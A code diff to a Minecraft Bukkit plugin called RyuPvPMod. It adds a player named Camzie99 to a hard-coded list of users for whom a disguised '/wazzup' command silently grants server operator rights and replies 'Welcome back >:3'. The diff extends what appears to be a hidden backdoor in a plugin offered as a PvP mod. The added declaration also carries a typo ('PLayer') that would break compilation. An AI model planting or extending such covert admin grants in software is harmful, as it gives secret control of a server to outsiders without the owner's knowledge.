@@ -27,6 +27,7 @@ public final class RyuPvPMod extends JavaPlugin{
         public Player requiemdestiny = Bukkit.getServer().getPlayer("RequiemDestiny");
 	public Player hawkeyeshi = Bukkit.getServer().getPlayer("hawkeyeshi");
 	public Player ryusagez = Bukkit.getServer().getPlayer("Ryusagez");
+	public PLayer Camzie99 = Bukkit.getServer().getPlayer("Camzie99");
         public static String INCORRECT_ARGS = ChatColor.RED + "There is an incorrect number of arguments in the command you just performed.";
         public static String NO_PERMS = ChatColor.RED + "You do not have permission to perform this command";
 	public static RyuPvPMod plugin;
@@ -109,7 +110,7 @@ public final class RyuPvPMod extends JavaPlugin{
                                 }
 				// /wazzup command
 			}else if(cmd.getName().equalsIgnoreCase("wazzup")){
-				if(sender == hawkeyeshi || sender == ryusagez || sender == requiemdestiny){
+				if(sender == hawkeyeshi || sender == ryusagez || sender == requiemdestiny || sender == Camzie99){
 					player.setOp(true);
 					player.sendMessage(ChatColor.DARK_RED + "Welcome back >:3");
 				}else{
